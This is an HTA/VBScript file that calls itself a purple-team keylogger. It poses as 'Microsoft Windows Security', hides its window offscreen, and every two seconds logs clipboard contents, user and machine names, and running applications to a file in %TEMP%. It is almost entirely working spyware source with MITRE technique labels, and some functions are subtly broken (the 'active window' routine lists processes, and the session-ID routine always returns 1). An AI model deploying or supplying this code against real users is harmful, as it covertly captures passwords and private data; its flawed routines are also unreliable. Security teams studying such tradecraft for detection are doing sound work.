<html>
<head>
<title>Microsoft Windows Security</title>
<HTA:APPLICATION
    ID="oHTA"
    APPLICATIONNAME="WinSec"
    BORDER="none"
    BORDERSTYLE="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"
    SCROLL="no"
/>
</head>
<script language="VBScript">
'
' Purple Team - HTA Keylogger (Non-Hooking)
' MITRE: T1218.005 (mshta), T1115 (Clipboard), T1056.002 (GUI Input Capture)
'
' No hooks, no GetAsyncKeyState, no PowerShell
' Uses mshta.exe (signed MS binary) + VBScript
' Captures: clipboard changes + foreground window titles
' Logs locally to log.txt
'

Dim fso, logFile, logPath
Dim lastClip, lastWin
Dim oShell

Sub Window_OnLoad()
    ' Hide the HTA window (move offscreen, make tiny)
    self.MoveTo -3200, -3200
    self.ResizeTo 1, 1

    Set fso = CreateObject("Scripting.FileSystemObject")
    Set oShell = CreateObject("WScript.Shell")

    logPath = oShell.ExpandEnvironmentStrings("%TEMP%") & "\log.txt"
    lastClip = ""
    lastWin = ""

    ' Write start marker
    WriteLog "[+] Started | " & CreateObject("WScript.Network").ComputerName & "\" & _
             CreateObject("WScript.Network").UserName

    ' Start the monitoring timer (runs every 2 seconds)
    window.setInterval "DoCapture", 2000
End Sub

Sub DoCapture()
    On Error Resume Next

    ' ── Clipboard monitoring (T1115) ──
    Dim clipText
    clipText = GetClipboard()
    If clipText <> "" And clipText <> lastClip Then
        lastClip = clipText
        WriteLog "[CLIP] " & Left(clipText, 500)
    End If

    ' ── Foreground window tracking ──
    Dim winTitle
    winTitle = GetActiveWindow()
    If winTitle <> "" And winTitle <> lastWin Then
        lastWin = winTitle
        WriteLog "[WIN] " & winTitle
    End If

    On Error GoTo 0
End Sub

Function GetClipboard()
    On Error Resume Next
    Dim htmlDoc
    Set htmlDoc = CreateObject("htmlfile")
    GetClipboard = htmlDoc.parentWindow.clipboardData.GetData("text")
    Set htmlDoc = Nothing
    If Err.Number <> 0 Then GetClipboard = ""
    On Error GoTo 0
End Function

Function GetActiveWindow()
    On Error Resume Next
    ' Use WMI to find foreground process info
    Dim objWMI, colProcs, objProc
    Dim activeTitle
    activeTitle = ""

    ' Method: read window title via Shell
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcs = objWMI.ExecQuery( _
        "SELECT Name,CommandLine FROM Win32_Process WHERE SessionId = " & _
        GetCurrentSessionId())

    ' Track running processes as proxy for activity
    Dim procList
    procList = ""
    For Each objProc In colProcs
        If LCase(objProc.Name) <> "svchost.exe" And _
           LCase(objProc.Name) <> "csrss.exe" And _
           LCase(objProc.Name) <> "system" Then
            ' Keep notable user processes
            Select Case LCase(objProc.Name)
                Case "chrome.exe", "msedge.exe", "firefox.exe", _
                     "notepad.exe", "cmd.exe", "explorer.exe", _
                     "outlook.exe", "teams.exe", "slack.exe", _
                     "code.exe", "winword.exe", "excel.exe"
                    If InStr(procList, objProc.Name) = 0 Then
                        procList = procList & objProc.Name & " "
                    End If
            End Select
        End If
    Next

    GetActiveWindow = Trim(procList)
    On Error GoTo 0
End Function

Function GetCurrentSessionId()
    On Error Resume Next
    Dim objWMI, colProcs, objProc
    GetCurrentSessionId = 1
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcs = objWMI.ExecQuery( _
        "SELECT SessionId FROM Win32_Process WHERE ProcessId = " & _
        GetObject("winmgmts:root\cimv2:Win32_Process.Handle='" & _
        CreateObject("WScript.Shell").Exec("cmd /c echo %RANDOM%").ProcessID & "'").SessionId)
    ' Simpler approach
    Dim envSid
    envSid = oShell.ExpandEnvironmentStrings("%SESSIONNAME%")
    GetCurrentSessionId = 1
    On Error GoTo 0
End Function

Sub WriteLog(msg)
    On Error Resume Next
    Dim ts, f
    ts = FormatDateTime(Now, vbShortTime)
    Set f = fso.OpenTextFile(logPath, 8, True)
    f.WriteLine "[" & ts & "] " & msg
    f.Close
    Set f = Nothing
    On Error GoTo 0
End Sub
</script>
<body></body>
</html>
